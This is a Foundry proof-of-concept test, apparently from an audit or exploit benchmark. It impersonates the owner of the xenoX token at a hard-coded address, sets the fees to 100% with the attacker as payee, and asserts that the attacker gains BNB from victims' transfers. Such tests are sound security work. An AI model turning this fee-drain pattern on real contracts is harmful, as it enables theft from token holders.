pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface xenoX {
    function owner() external view returns (address);
    function pancakeRouter() external view returns (IPancakeRouter02);
    function pancakePair() external view returns (address);
    function setBuyTaxFeePercent(uint256 taxFee) external;
    function setBuyLiquidityFeePercent(uint256 liquidityFee) external;
    function setBuydevFeePercent(uint256 devFee) external;
    function setSellTaxFeePercent(uint256 taxFee) external;
    function setSellLiquidityFeePercent(uint256 liquidityFee) external;
    function setSelldevFeePercent(uint256 devFee) external;
    function setdevAddress(address payable devAddress) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    address public owner;
    IPancakeRouter02 public pancakeRouter;
    address public pancakePair;
    address public victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "xenoX Token");
        vm.label(attacker, "Attacker");

        // Get the owner address
        owner = xenoX(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Get router and pair from the contract
        pancakeRouter = xenoX(TARGET).pancakeRouter();
        pancakePair = xenoX(TARGET).pancakePair();
        vm.label(address(pancakeRouter), "PancakeRouter");
        vm.label(pancakePair, "PancakePair");

        // Create victim address
        victim = address(0x1337);
        vm.label(victim, "Victim");

        // Inject BNB for gas
        deal(attacker, 10 ether);
        deal(victim, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker BNB balance
        uint256 initialAttackerBalance = attacker.balance;
        console.log("Initial Attacker BNB:", initialAttackerBalance);

        // Step 1: Impersonate owner and set maximum fees (both buy and sell)
        vm.startPrank(owner);
        xenoX(TARGET).setBuyTaxFeePercent(0);
        xenoX(TARGET).setBuyLiquidityFeePercent(0);
        xenoX(TARGET).setBuydevFeePercent(100); // 100% buy fee to dev
        xenoX(TARGET).setSellTaxFeePercent(0);
        xenoX(TARGET).setSellLiquidityFeePercent(0);
        xenoX(TARGET).setSelldevFeePercent(100); // 100% sell fee to dev
        xenoX(TARGET).setdevAddress(payable(attacker));
        vm.stopPrank();

        // Step 2: Give victim tokens (need enough to trigger swapAndLiquify threshold)
        // Threshold is 10000 * 1e9 tokens
        uint256 victimTokenAmount = 20000 * 1e9;
        deal(TARGET, victim, victimTokenAmount);

        // Step 3: Create a receiver address for victim's transfer
        address receiver = address(0x4567);
        vm.label(receiver, "Receiver");

        // Step 4: Victim transfers tokens (this triggers fee collection)
        // 100% fee means all tokens go to contract as fees
        vm.startPrank(victim);
        IBEP20(TARGET).transfer(receiver, victimTokenAmount);
        vm.stopPrank();

        // Step 5: Check contract token balance
        uint256 contractBalance = IBEP20(TARGET).balanceOf(TARGET);
        uint256 threshold = 10000 * 1e9;
        console.log("Contract token balance:", contractBalance);
        console.log("Threshold:", threshold);

        // Step 6: If threshold reached, one more transfer will trigger swapAndLiquify
        // Add more tokens to victim and transfer again
        if (contractBalance >= threshold) {
            // Need another transfer to trigger swapAndLiquify
            deal(TARGET, victim, 1000 * 1e9);
            vm.startPrank(victim);
            IBEP20(TARGET).transfer(receiver, 1000 * 1e9);
            vm.stopPrank();
        }

        // Step 7: Verify attacker received BNB from fees
        uint256 finalAttackerBalance = attacker.balance;
        console.log("Final Attacker BNB:", finalAttackerBalance);
        console.log("Profit:", finalAttackerBalance > initialAttackerBalance ? finalAttackerBalance - initialAttackerBalance : 0);

        // Oracle check: attacker balance should have increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker BNB balance did not increase");
    }

    receive() external payable {}

    fallback() external payable {}
}

